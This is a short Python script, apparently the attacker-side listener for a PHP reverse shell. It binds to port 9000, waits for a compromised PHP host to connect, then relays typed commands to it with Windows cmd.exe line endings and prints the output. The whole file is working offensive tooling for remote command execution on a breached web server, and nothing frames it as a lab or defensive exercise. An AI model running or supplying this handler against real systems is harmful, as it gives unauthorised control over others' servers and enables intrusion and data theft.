import socket
import sys
import threading

IP = "0.0.0.0"
PORT = 9000

# Tolerant console output: the shell may send any UTF-8 bytes, and the
# Windows console defaults to cp1252 — without this, the reader thread
# crashes with UnicodeEncodeError on non-latin characters.
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(errors="replace")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((IP, PORT))
server.listen(5)

print(f"Listening on {IP}:{PORT}", flush=True)


def session(conn, addr):
    """Handle one PHP connection: relay console input to it, print what it sends back."""
    print(f"PHP connected: {addr}", flush=True)
    conn.sendall(b"*** Shell session started (type commands and press Enter) ***\n")

    done = threading.Event()

    def reader():
        # Prints everything the PHP/stream side sends back (stdout+stderr)
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", errors="replace"))
                sys.stdout.flush()
        except OSError:
            pass
        finally:
            done.set()

    threading.Thread(target=reader, daemon=True).start()

    # Send every line you type straight across the socket.
    # "\r\n" is what cmd.exe expects as the Enter key.
    try:
        for line in sys.stdin:
            if done.is_set():
                break
            conn.sendall(line.rstrip("\r\n").encode("utf-8") + b"\r\n")
    except OSError:
        pass

    # Keep the session open until the PHP side disconnects
    done.wait()
    conn.close()
    print(f"\nSession ended: {addr}", flush=True)


while True:
    conn, addr = server.accept()
    session(conn, addr)
